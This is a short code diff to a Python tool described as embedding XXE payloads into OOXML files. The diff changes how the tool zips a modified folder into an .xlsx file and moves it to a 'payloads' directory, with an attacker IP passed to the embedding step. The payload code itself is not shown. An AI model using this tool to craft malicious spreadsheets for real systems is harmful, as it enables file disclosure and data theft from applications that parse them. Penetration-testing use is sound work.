@@ -48,6 +48,12 @@ def embed_payload(file, ip):
     f.close()
 
 
+def compress(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+
 def main():
     parser = argparse.ArgumentParser(description='Embed XXE payloads into OOXML files')
     
@@ -72,13 +78,13 @@ def main():
                 embed_payload(new_file_name, args.ip_address)
 
                 output = str(tmp_dir).strip('.tmp').replace('.', '_')
-                shutil.make_archive(output, 'zip', tmp_dir)
+                zipf = zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED)
+                compress(tmp_dir, zipf)
 
-                rnm = output + '.zip'
-                new = output + '.xlsx'
-                os.rename(rnm, new)
+                add_ext = output + '.xlsx'
+                os.rename(output, add_ext)
 
-                shutil.move(new, 'payloads')
+                shutil.move(add_ext, 'payloads')
                 shutil.rmtree(tmp_dir)
 
             else:
